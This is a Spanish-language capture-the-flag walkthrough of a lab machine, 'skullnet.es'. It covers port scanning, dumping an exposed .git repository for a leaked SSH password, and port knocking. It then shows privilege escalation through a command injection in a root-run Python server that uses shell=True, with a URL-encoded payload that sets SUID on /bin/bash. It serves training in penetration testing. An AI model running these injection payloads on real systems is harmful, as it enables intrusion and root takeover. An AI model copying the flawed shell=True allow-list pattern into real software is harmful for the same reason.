# Enumeracion de Puertos, Servicios y Versiones

```ruby
nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 172.18.0.2 -oN nmap
```

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-20 01:10 -03
Nmap scan report for 172.18.0.2
Host is up (0.00014s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://skullnet.es/
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:12:00:02 (Unknown)
Service Info: Host: 172.18.0.2
```
observo un dominio `skullnet.es` asi que lo agrego en `/etc/hosts`

```ruby
echo '172.18.0.2 skullnet.es' >> /etc/hosts
```
y como solo existe un servicio levantado `http/80` accedo a la web

![image](https://github.com/user-attachments/assets/2fb2e4bf-4499-4969-bcc9-8e59f1967939)

el unico boton que existe no funciona, asi que fuzzeo la web

# Fuzzing web

```ruby
feroxbuster -u 'http://skullnet.es' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -s 200,301,302 -x txt,php,bak,db,py,html,js,jpg,png,git,sh -t 40 --random-agent --no-state -d 5
```
```bash
                                                                                                                                                                        
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://skullnet.es
 🚀  Threads               │ 40
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 👌  Status Codes          │ [200, 301, 302]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, bak, db, py, html, js, jpg, png, git, sh]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 5
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       59l      106w      957c http://skullnet.es/styles.css
200      GET      642l     3095w   282292c http://skullnet.es/skullnet.jpg
200      GET       19l       40w      539c http://skullnet.es/
200      GET       19l       40w      539c http://skullnet.es/index.html
301      GET        9l       28w      309c http://skullnet.es/.git => http://skullnet.es/.git/
200      GET        4l        7w      450c http://skullnet.es/.git/index
200      GET        1l       10w       73c http://skullnet.es/.git/description
200      GET        1l        1w        4c http://skullnet.es/.git/COMMIT_EDITMSG
200      GET        5l       13w       92c http://skullnet.es/.git/config
200      GET        1l        2w       23c http://skullnet.es/.git/HEAD
200      GET        6l       43w      240c http://skullnet.es/.git/info/exclude
200      GET        8l       32w      189c http://skullnet.es/.git/hooks/post-update.sample
200      GET       77l      323w     2308c http://skullnet.es/.git/hooks/sendemail-validate.sample
200      GET      174l      675w     4726c http://skullnet.es/.git/hooks/fsmonitor-watchman.sample
200      GET       24l       83w      544c http://skullnet.es/.git/hooks/pre-receive.sample
200      GET       78l      499w     2783c http://skullnet.es/.git/hooks/push-to-checkout.sample
200      GET       24l      163w      896c http://skullnet.es/.git/hooks/commit-msg.sample
200      GET       42l      238w     1492c http://skullnet.es/.git/hooks/prepare-commit-msg.sample
200      GET       15l       79w      478c http://skullnet.es/.git/hooks/applypatch-msg.sample
200      GET      169l      798w     4898c http://skullnet.es/.git/hooks/pre-rebase.sample
200      GET       14l       69w      424c http://skullnet.es/.git/hooks/pre-applypatch.sample
200      GET       49l      279w     1643c http://skullnet.es/.git/hooks/pre-commit.sample
200      GET      128l      546w     3650c http://skullnet.es/.git/hooks/update.sample
200      GET       13l       67w      416c http://skullnet.es/.git/hooks/pre-merge-commit.sample
200      GET       53l      234w     1374c http://skullnet.es/.git/hooks/pre-push.sample
200      GET        2l       18w      293c http://skullnet.es/.git/logs/HEAD
200      GET       18l      131w    11026c http://skullnet.es/.git/objects/76/19fb92be7edfeb26509593739523c00e0f766d
200      GET        2l        5w      282c http://skullnet.es/.git/objects/9c/902d081106a85cf2d928cd96a1cd9c90d7a2c9
200      GET        4l        8w      575c http://skullnet.es/.git/objects/66/b8c5c0725f98d4f1c50ea8d1a8c73bf43a9bd4
200      GET        2l       11w      772c http://skullnet.es/.git/objects/d9/34ab544c0680ad517e234fdcc1025fc6ce03e1
200      GET      599l     3058w   282901c http://skullnet.es/.git/objects/b6/313a134f2058c94e3310b0e1f435b55f4b7fa1
200      GET        2l        4w      239c http://skullnet.es/.git/objects/d6/3ecff7430448a3075d46caf92803c33a40d313
200      GET        1l        1w       41c http://skullnet.es/.git/refs/heads/master
200      GET        1l        2w      355c http://skullnet.es/.git/objects/c2/52d3edf77f34de8a24bd4a2486cb42268c2bd7
200      GET        2l        9w      334c http://skullnet.es/.git/objects/ca/f37fbd4ec7caa864353e03b74ad041f93c04a7
200      GET        3l        5w      217c http://skullnet.es/.git/objects/64/8d951e0f8b7cc60b11c82d9328fe9cb1a4a53d
200      GET        2l       18w      293c http://skullnet.es/.git/logs/refs/heads/master
```

por lo visto estoy ante un repositorio git, asi que me lo voy a traer a local

```ruby
wget -r http://skullnet.es/.git
```
![image](https://github.com/user-attachments/assets/63fe48ce-92a9-438d-920b-6766e0903acc)

ahora me ubido dentro del directorio `skullnet.es` para examinar el repositorio

```ruby
git log -p
```
```bash
commit 9c902d081106a85cf2d928cd96a1cd9c90d7a2c9 (HEAD -> master)
Author: admin <admin@skullnet.es>
Date:   Thu Jun 20 18:08:35 2024 +0200

    Fix

diff --git a/authentication.txt b/authentication.txt
deleted file mode 100644
index caf37fb..0000000
--- a/authentication.txt
+++ /dev/null
@@ -1,5 +0,0 @@
-Hello skulloperator, as you know, we are implementing a new authentication mechanism to avoid brute-forcing...
-
-This credential and the attached network file will be enough. I know you will get it ;)
-
-+%7nj^g!DQxp]a>c4v&0
diff --git a/network.pcap b/network.pcap
deleted file mode 100644
index 7619fb9..0000000
Binary files a/network.pcap and /dev/null differ

commit 648d951e0f8b7cc60b11c82d9328fe9cb1a4a53d
Author: admin <admin@skullnet.es>
Date:   Thu Jun 20 18:07:45 2024 +0200

    First commit

diff --git a/authentication.txt b/authentication.txt
new file mode 100644
index 0000000..caf37fb
--- /dev/null
+++ b/authentication.txt
@@ -0,0 +1,5 @@
+Hello skulloperator, as you know, we are implementing a new authentication mechanism to avoid brute-forcing...
+
:
```

aqui puedo observar el mensaje

```bash
-Hello skulloperator, as you know, we are implementing a new authentication mechanism to avoid brute-forcing...
-
-This credential and the attached network file will be enough. I know you will get it ;)
```

Posible User: `skulloperator` Password: `+%7nj^g!DQxp]a>c4v&0` - archivo de red adjunto: `network.pcap` - como el archivo de red no exites, tendre que recuperarlo revirtiendo cambios en el commit

```ruby
git revert 9c902d081106a85cf2d928cd96a1cd9c90d7a2c9
```

![image](https://github.com/user-attachments/assets/2b7b3652-7444-4fae-bb53-d80c29029702)

ya restaurado el archivo de red del que hacen referencia en el mensaje anterior procedo a analizar su contenido

![image](https://github.com/user-attachments/assets/6e495bfe-c468-40e2-8d43-31e1fcc98b08)

estoy observando que existen conexiones `SSH` pero el reporte de `nmap` no me reporto este puerto, mejor abro el archivo de red desde `wireshark` para observar mejor

![image](https://github.com/user-attachments/assets/5ffc3d4c-5b89-4063-9630-66b53fc738e5)


lo que puedo observar en los 3 primeros paquetes es que desde la ip `172.17.0.1` a la ip `172.17.0.2` hubo una conexion a los puertos `1000` `12000` y `5000`
y seguido de esto la conexion al puerto `22/SSH` lo que me parece se esta ocultando el puerto 22 a traves de la tecnica `Port Knocking` asi que primero golpeando 
los puertos en el mismo orden y escaneo nuevamente con `nmap`

![image](https://github.com/user-attachments/assets/9e71c4be-4b02-4f42-a80d-2e1f134bdbb3)

en efecto, era esto lo que ocultaba el puerto 22 y si recuerdo, tengo un posible user `skulloperator` y una password `+%7nj^g!DQxp]a>c4v&0` que probare contra `SSH`

![image](https://github.com/user-attachments/assets/b3d64860-0a4f-4ed5-8a37-f57d3feaf862)

y he conseguido el acceso al sistema

# Escalada de Privilegios

### skulloperator

Despues de un rato buscando la manera de escalar, observo los procesos y me encuentro con que `root` ejecuta el siguiente script en python

![image](https://github.com/user-attachments/assets/9c020d2c-9a23-4cc5-a7bc-a9398f83a861)

asi que veo de que trata el script

```bash
import http.server
import socketserver
import urllib.parse
import subprocess
import base64
import os

PORT = 8081

AUTH_KEY_BASE64 = "d2VfYXJlX2JvbmVzXzUxMzU0NjUxNjQ4NjQ4NA=="

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        
        auth_header = self.headers.get('Authorization')

        if auth_header is None or not auth_header.startswith('Basic' ):
            self.send_response(401)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Authorization header is missing or incorrect")
            return
        
        clear_text_key = auth_header.split('Basic ')[1]
        
        decoded_key = base64.b64decode(AUTH_KEY_BASE64).decode()
        
        if clear_text_key != decoded_key:
            self.send_response(403)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Invalid authorization key")
            return

        parsed_path = urllib.parse.urlparse(self.path)
        query_params = urllib.parse.parse_qs(parsed_path.query)

        if 'exec' in query_params:
            command = query_params['exec'][0]
            try:
                allowed_commands = ['ls', 'whoami']
                if not any(command.startswith(cmd) for cmd in allowed_commands):
                    self.send_response(403)
                    self.send_header("Content-type", "text/plain")
                    self.end_headers()
                    self.wfile.write(b"Command not allowed.")
                    return

                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                self.send_response(200)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(result)
            except subprocess.CalledProcessError as e:
                self.send_response(500)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(e.output)
        else:
            self.send_response(400)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Missing 'exec' parameter in URL")

with socketserver.TCPServer(("", PORT), Handler) as httpd:
    httpd.serve_forever()
```

Este código crea un servidor HTTP en el puerto 8081 que solo permite ejecutar ciertos comandos (whoami y ls) del sistema si se proporciona una clave 
de autenticación válida en la cabecera de la solicitud, el parametro para la ejecucion de comandos seria `exec`, si reconstruyo esto, entonces quedaria:

```ruby
http://127.0.0.1:8081?exec=ls
```
en cuanto a la cabecera espera recibir en la socitud

```bash
Authorization: Basic we_are_bones_513546516486484
```

por lo que ahora realizo la peticion con `curl` pasandole la cabecera que espera

```ruby
curl -H 'Authorization: Basic we_are_bones_513546516486484' http://127.0.0.1:8081?exec=ls
```

![image](https://github.com/user-attachments/assets/43d76a2c-4fb6-428e-b002-8a7648b5e3c3)

el problema llega porque solo es posible la ejecucion de los comandos `ls` y `whoami` pero tras detallar el codigo encuentro la vulnerabilidad 

![image](https://github.com/user-attachments/assets/2ee2731e-ba22-4877-aacc-ba18681b1b32)

El uso de `shell=True` en `subprocess` permite la inyeccion de comandos, ejemplo:

![image](https://github.com/user-attachments/assets/b91fe7a3-4547-4cf5-946d-eac4afe2c7fc)

solo que el comando despues del `;` se ejecuta como el user `skulloperator` pero esto lo soluciono `url-encodeando` el comando

![image](https://github.com/user-attachments/assets/4915aace-ade9-4c61-b6f4-171e526434b6)

ahora si lo ejecuta como `root` el segundo comando, ya para terminar la escalada, ejecuto lo siguiente:

```ruby
curl -H 'Authorization: Basic we_are_bones_513546516486484' http://127.0.0.1:8081?exec=ls;chmod u+s /bin/bash
```
el comando url-encodeado quedaria finalmente:

```ruby
curl -H "Authorization: Basic we_are_bones_513546516486484" http://localhost:8081?exec=%6c%73%3b%63%68%6d%6f%64%20%75%2b%73%20%2f%62%69%6e%2f%62%61%73%68
```

![image](https://github.com/user-attachments/assets/de2e1c28-031f-43b4-94b2-91260a612962)

```ruby
/bin/bash -p
```
![image](https://github.com/user-attachments/assets/3971710c-a15c-40c8-9a74-5b7813be20d1)

### `ROOT`

![image](https://github.com/user-attachments/assets/dbb4b0c3-88a4-419d-b143-82c0332a2059)







